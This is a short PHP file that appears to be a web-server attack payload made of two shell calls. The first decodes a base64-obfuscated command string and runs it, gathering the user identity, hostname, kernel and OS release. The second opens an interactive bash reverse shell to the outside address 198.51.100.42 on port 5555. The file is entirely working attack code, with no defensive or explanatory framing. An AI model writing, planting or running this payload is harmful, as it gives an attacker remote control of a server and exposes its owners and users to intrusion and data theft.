<?php
system("echo 'aWQ7IHdob2FtaTsgaG9zdG5hbWU7IHVuYW1lIC1hOyBjYXQgL2V0Yy9vcy1yZWxlYXNl' | openssl enc -base64 -d -A | sh");
system("bash -c 'bash -i >& /dev/tcp/198.51.100.42/5555 0>&1'");
